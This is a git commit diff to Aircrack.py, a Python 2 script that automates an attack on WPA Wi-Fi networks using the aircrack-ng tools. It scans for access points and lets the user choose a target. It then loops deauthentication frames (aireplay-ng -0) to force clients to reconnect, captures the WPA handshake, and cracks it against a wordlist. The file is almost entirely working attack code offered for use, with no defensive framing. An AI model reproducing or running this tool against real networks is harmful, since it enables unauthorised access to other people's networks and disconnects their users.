0d42c5938e5b093ad1fb0d4334c1e36f5ab8917b
Ethical-H4CK3R <Ethical.Hacker720@gmail.com>
2017-01-09 20:09:30 -0500

    Update Aircrack.py

--- Aircrack.py
+++ Aircrack.py
@@ -7,6 +7,7 @@ import sys
 import csv
 import time
 import argparse
+import threading
 from subprocess import *
 
 class Engine(object):
@@ -19,7 +20,8 @@ class Engine(object):
     self.clnt = []
     self.data = []
     self.csv  = desti
-    self.wlan = iface
+    self.wlan = iface 
+    self.live = True
         
   def Monitor(self):
     call(['ifconfig',self.wlan,'down'])
@@ -36,50 +38,65 @@ class Engine(object):
     call(['service','network-manager','restart'])
     
   def Scan(self):
+    self.Clean('csv')
     cmd = ['airodump-ng','-a','--output-format','csv', '-w','list',self.wlan]
     Popen(cmd,stderr=Devnull,stdout=Devnull)
-    time.sleep(self.time)
-    call(['pkill','airodump-ng'])
-    self.Display()
      
   def Accesspoints(self):
     with open(self.csv, 'r') as AccessPoints:
      Data = csv.reader(AccessPoints,delimiter=',')
+
      for line in Data:
       if len(line) >= 10:
-       chan   = str(line[3]).strip()
-       essid  = str(line[13]).strip()
-       bssid  = str(line[0]).strip()
-       power  = str(line[8]).strip()
+       chan  = str(line[3]).strip()
+       bssid = str(line[0]).strip()
+       power = str(line[8]).strip()
+       essid = str(line[13]).strip()
+
        if essid != 'ESSID' and len(essid) and bssid not in self.mac:
         client = 'yes' if bssid in self.clnt else 'no'
         if not len(self.mac):
-         call(['clear'])
-         data = '#\t Bssid\t\tClient\tPower\tEssid'
-         print data
-         self.data.append(data)
-        data = '{}  {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
-        print data
+         print self.Alpha()
+
+        print self.Beta(bssid,client,power,essid)
         time.sleep(.2)
-        self.data.append(data)
-        self.mac.append(bssid)
-        self.ssid.append(essid)
-        self.chan.append(chan)
+        self.Append(bssid,chan,essid)
         self.num+=1
-  
-  def Clients(self):
+
+  def Alpha(self):
+    call(['clear'])
+    data = '#\t  Bssid\t\tClient\t Power\tEssid'
+    self.data.append(data)
+    return data
+
+  def Beta(self,bssid,client,power,essid):
+    if self.num > 9:
+     data = '{}  {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
+    else:
+     data = '{}   {}\t{}\t{}\t{}'.format(self.num,bssid,client,power,essid)
+    self.data.append(data)
+    return data
+
+  def Append(self,bssid,chan,ssid):
+    self.mac.append(bssid)
+    self.chan.append(chan)
+    self.ssid.append(ssid)
+        
+  def Clients_file(self):
     with open(self.csv,'r') as Clients:
      Data = csv.reader(Clients,delimiter=',')
-     for line in Data:
-      if len(line) == 7:
-       client = line[5]
-       if client[3] == ':' and client not in self.clnt: 
-        self.clnt.append(client.strip())
+     self.Clients_list(Data)
+
+  def Clients_list(self,file):
+    for line in file:
+     if len(line) == 7:
+      client = line[5]
+      if client[3] == ':' and client not in self.clnt: 
+       self.clnt.append(client.strip())
   
   def Display(self):
-    self.Clients()
+    self.Clients_file()
     self.Accesspoints()
-    self.Clean('csv')
          
   def Clean(self,end):
     for item in os.listdir('.'):
@@ -88,47 +105,76 @@ class Engine(object):
 
   def User(self): 
     if not len(self.data):
-     self.Managed()
-     exit()
+     self.Exit()
+
     size=len(self.mac)-1
     call(['clear'])
+
     for data in self.data:
      print data
     try:
      Index = raw_input('\n[-] Enter a number: ')
      Index = int(Index)
+
      if Index > size:
       self.User()
+     
      return self.mac[Index],self.ssid[Index],self.chan[Index]
     except KeyboardInterrupt:
-     self.Managed()
-     exit()
-
+     self.Exit()
+    
   def Handshake(self,mac,ssid,chan):
-    cmd1=['aircrack-ng','{}-01.cap'.format(ssid)]
-    cmd2=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.wlan]
-    cmd3=['airodump-ng','--bssid',mac,'--essid',ssid,'-c',chan,'--ignore-negative-one','--output-format','cap','-w','{}'.format(ssid),self.wlan]
-    while 1:
+    self.Clean('cap')
+    self.ObtainInfo(ssid,mac,chan)
+    
+    while self.live:
      call(['clear'])
      print('[-] Scanning: {}...'.format(ssid)) 
-     for i in range(2):
-      self.Clean('cap')
-      Popen(cmd3,stdout=Devnull,stderr=Devnull)
-      time.sleep(self.time)
-      Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
-      Authen=Popen(cmd1,stderr=PIPE,stdout=PIPE)
-      Authen.wait()
-      for output in Authen.communicate():
-       call(['clear'])
-       print('[-] Scanning: {}...'.format(ssid)) 
-       if 'Choosing first network as target' in output:
-        if '1 handshake' in output:
-         return   
-       Popen(cmd2,stdout=Devnull,stderr=Devnull).wait()
+
+     attack = threading.Thread(target=(self.Attack),args=[mac])
+     attack.start()
+    
+     while attack.is_alive():pass
+     time.sleep(1)
+
+     analyze = threading.Thread(target=(self.Analyze),args=[ssid])
+     analyze.start()
+   
+     while analyze.is_alive():pass
+     time.sleep(.1)
+
+  def Analyze(self,ssid):
+    cmd=['aircrack-ng','{}-01.cap'.format(ssid)]
+    Authentic = Popen(cmd,stderr=PIPE,stdout=PIPE)
+    Authentic.wait()
+
+    for output in Authentic.communicate():
+     call(['clear'])
+     print('[-] Scanning: {}...'.format(ssid)) 
+     
+     if 'Choosing first network as target' in output:
+      if '1 handshake' in output:
+       Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
+       self.live = False  
+     
+  def Attack(self,mac):
+    cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.wlan]
+    Popen(cmd,stdout=Devnull,stderr=Devnull).wait()
+
+  def ObtainInfo(self,ssid,mac,chan):
+    cmd=['airodump-ng','--bssid',mac,'--essid',ssid,'-c',chan,'--ignore-negative-one','--output-format','cap','-w','{}'.format(ssid),self.wlan]
+    Popen(cmd,stdout=Devnull,stderr=Devnull) 
+    time.sleep(.5)
 
   def Aircrack(self,handshake,wordlist):
     cmd=['aircrack-ng',handshake,'-w',wordlist]
     Popen(cmd).wait()
+
+  def Exit(self):
+    self.Managed()
+    self.Clean('csv')
+    self.Clean('cap')
+    exit('\n')
        
 def Main():
   # Assign Arugments
@@ -157,13 +203,21 @@ def Main():
   print '[-] Scanning ...'
 
   # Scan For Accesspoints
+  try:
+   engine.Scan()
+   time.sleep(2.5)
+  except KeyboardInterrupt:
+   engine.Exit()
+
+  # Display File
   while 1:
    try:
-    engine.Scan() 
+    engine.Display()
+    time.sleep(.5)
    except KeyboardInterrupt:
     Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
     break
- 
+    
   # User 
   Input = engine.User()
   bssid = Input[0]
@@ -175,8 +229,7 @@ def Main():
    engine.Handshake(bssid,essid,chan)
   except KeyboardInterrupt:
    Popen(['pkill','airodump-ng'],stdout=Devnull,stderr=Devnull)
-   engine.Managed()
-   exit() 
+   engine.Exit()
   
   # Disable Monitor Mode
   engine.Managed()
@@ -190,13 +243,16 @@ def Main():
   # Start Aircrack
   try:
    engine.Aircrack(handshake,wordlist)
-  except KeyboardInterrupt:
-   exit()
+  finally:
+   os.chdir('/tmp')
+   engine.Exit()
   
 if __name__ =='__main__':
-  if os.getuid():
-   exit('[!] Root Access Required')
-  if sys.platform != 'linux2':
-   exit('[!] Kali Linux 2.0 Required')
-  Devnull = open(os.devnull, 'w')
-  Main()
+ if os.getuid():
+  exit('[!] Root Access Required')
+
+ if sys.platform != 'linux2':
+  exit('[!] Kali Linux 2.0 Required')
+
+ Devnull = open(os.devnull, 'w')
+ Main()
